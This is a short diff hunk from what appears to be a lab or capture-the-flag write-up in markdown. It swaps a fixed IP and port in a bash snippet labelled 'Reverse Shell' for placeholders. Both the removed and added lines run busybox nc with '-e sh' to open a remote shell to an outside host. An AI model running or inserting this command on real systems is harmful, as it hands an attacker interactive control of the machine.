@@ -160,7 +160,7 @@ nano /tmp/test.sh
 ```bash
 #Reverse Shell
 #!/bin/bash
-busybox nc 10.10.16.16 1133 -e sh
+busybox nc <YOUR_IP> <YPUR_PORT> -e sh
 ```
 
 ```bash
